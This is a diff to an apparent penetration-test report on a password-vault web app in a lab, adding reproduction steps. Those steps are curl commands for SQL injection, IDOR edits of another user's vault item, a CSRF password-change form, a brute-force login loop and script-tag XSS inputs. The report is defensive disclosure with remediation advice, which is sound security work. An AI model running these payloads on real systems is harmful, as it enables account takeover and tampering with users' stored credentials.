@@ -249,6 +249,27 @@ curl -X POST http://10.0.0.10/vault/add \
 
 ---
 
+#### Screenshots and Reproduction Steps
+
+**Screenshot 1:** SQL injection payload in vault add form (title field)
+
+**Screenshot 2:** Successful vault item creation response
+
+**Screenshot 3:** Vault display showing injected title
+
+**Command Output:**
+
+```
+curl -X POST http://10.0.0.10/vault/add \
+  -H "Cookie: connect.sid=[session]" \
+  -H "Content-Type: application/json" \
+  -d '{"vaulttitle":"test' OR '1'='1","vaultusername":"test","vaultpassword":"test123"}'
+
+Response: {"success":true,"message":"Item added successfully!"}
+```
+
+---
+
 ## Finding 3: Insecure Direct Object Reference (IDOR) - Vault Edit Endpoint
 
 **Severity:** HIGH (CVSS 8.8)  
@@ -326,6 +347,29 @@ curl -X PUT http://10.0.0.10/vault/edit/1 \
 
 ---
 
+#### Screenshots and Reproduction Steps
+
+**Screenshot 1:** Original vault item belonging to another user
+
+**Screenshot 2:** IDOR request modifying item ID of another user
+
+**Screenshot 3:** Successful update response
+
+**Screenshot 4:** Modified vault item in victim's vault
+
+**Command Output:**
+
+```
+curl -X PUT http://10.0.0.10/vault/edit/1 \
+  -H "Cookie: connect.sid=[attacker_session]" \
+  -H "Content-Type: application/json" \
+  -d '{"vaulttitle":"hacked title","vaultusername":"hacked","vaultpassword":"hacked"}'
+
+Response: {"success":true,"message":"Item updated successfully!"}
+```
+
+---
+
 # HIGH PRIORITY FINDINGS (Reportable Vulnerabilities)
 
 ## Finding 4: Cross-Site Request Forgery (CSRF) - Account Update
@@ -390,6 +434,32 @@ The account update endpoint (`POST /account/update`) lacks CSRF protection. An a
 
 ---
 
+#### Screenshots and Reproduction Steps
+
+**Screenshot 1:** Malicious CSRF HTML page
+
+**Screenshot 2:** Victim clicking the button
+
+**Screenshot 3:** Account update request in Burp
+
+**Screenshot 4:** Password successfully changed
+
+**Command Output:**
+
+```
+# Create csrf_test.html with the malicious form
+<form action="http://10.0.0.10/account/update" method="POST" id="csrfForm">
+  <input type="hidden" name="password" value="currentpass">
+  <input type="hidden" name="updatedPassword" value="hackedpass">
+  <input type="hidden" name="updateField" value="account">
+</form>
+<button onclick="document.getElementById('csrfForm').submit();">Click Me</button>
+
+# Response after submission: {"success":true,"message":"Account password updated successfully!"}
+```
+
+---
+
 ## Finding 5: Weak Rate Limiting - Login Endpoint
 
 **Severity:** MEDIUM  
@@ -441,6 +511,28 @@ done
 
 ---
 
+#### Screenshots and Reproduction Steps
+
+**Screenshot 1:** Burp Intruder setup for brute force login attempts
+
+**Screenshot 2:** First 50 requests succeeding (200 responses)
+
+**Screenshot 3:** Request 51+ returning HTTP 429
+
+**Command Output:**
+
+```
+for i in {1..60}; do
+  curl -X POST http://10.0.0.10/login \
+    -H "Content-Type: application/json" \
+    -d '{"username":"testuser","password":"wrongpass'$i'"}'
+done
+
+# Responses: 50x 200 OK, then 429 Too Many Requests
+```
+
+---
+
 # MEDIUM PRIORITY FINDINGS (Weaknesses)
 
 ## Finding 6: Weak Password Validation
@@ -469,6 +561,25 @@ curl -X POST http://10.0.0.10/account/update \
 
 ---
 
+#### Screenshots and Reproduction Steps
+
+**Screenshot 1:** Account update form accepting weak password
+
+**Screenshot 2:** Successful password change response
+
+**Command Output:**
+
+```
+curl -X POST http://10.0.0.10/account/update \
+  -H "Cookie: connect.sid=[session]" \
+  -H "Content-Type: application/json" \
+  -d '{"password":"current","updatedPassword":"1","updateField":"account"}'
+
+Response: {"success":true,"message":"Account password updated successfully!"}
+```
+
+---
+
 ## Finding 7: Client-Side Error Handling XSS Risk
 
 **Severity:** MEDIUM  
@@ -487,6 +598,25 @@ alert(data.message); // Unsanitized server response
 - Sanitize all server responses
 - Use `textContent` instead of `innerHTML`
 - Implement Content Security Policy (CSP)
+
+---
+
+#### Screenshots and Reproduction Steps
+
+**Screenshot 1:** JavaScript code using alert(data.message)
+
+**Screenshot 2:** Error response with unsanitized message (if applicable)
+
+**Command Output:**
+
+```
+# Trigger error by malformed request
+curl -X POST http://10.0.0.10/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test","password"}'
+
+# If XSS possible, alert would execute <script>alert('xss')</script>
+```
 
 ---
 
@@ -519,6 +649,22 @@ app.use((req, res, next) => {
 
 ---
 
+#### Screenshots and Reproduction Steps
+
+**Screenshot 1:** HTTP response headers showing missing security headers
+
+**Screenshot 2:** Burp response headers analysis
+
+**Command Output:**
+
+```
+curl -I http://10.0.0.10
+
+# Response headers should show absence of X-Frame-Options, X-Content-Type-Options, CSP, etc.
+```
+
+---
+
 ## Finding 9: Cleartext Password Submission
 
 **Severity:** MEDIUM  
@@ -531,6 +677,25 @@ Passwords are submitted over HTTP (not HTTPS) in the test environment, exposing 
 - Deploy HTTPS with valid SSL/TLS certificates
 - Enforce HSTS headers
 - Redirect all HTTP to HTTPS
+
+---
+
+#### Screenshots and Reproduction Steps
+
+**Screenshot 1:** Login request over HTTP showing cleartext password
+
+**Screenshot 2:** Network capture showing password in plain text
+
+**Command Output:**
+
+```
+# All requests are over HTTP
+curl -X POST http://10.0.0.10/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test","password":"password123"}'
+
+# Wireshark capture would show password in clear text
+```
 
 ---
 
@@ -547,6 +712,25 @@ Vault item fields (title, username, password) accept any input without validatio
 - Whitelist allowed characters
 - Enforce field length limits
 - Sanitize on both input and output
+
+---
+
+#### Screenshots and Reproduction Steps
+
+**Screenshot 1:** Vault add form accepting any input
+
+**Screenshot 2:** Stored data with no validation
+
+**Command Output:**
+
+```
+curl -X POST http://10.0.0.10/vault/add \
+  -H "Cookie: connect.sid=[session]" \
+  -H "Content-Type: application/json" \
+  -d '{"vaulttitle":"<script>alert(1)</script>","vaultusername":"test","vaultpassword":"test"}'
+
+# Item added without validation
+```
 
 ---
 
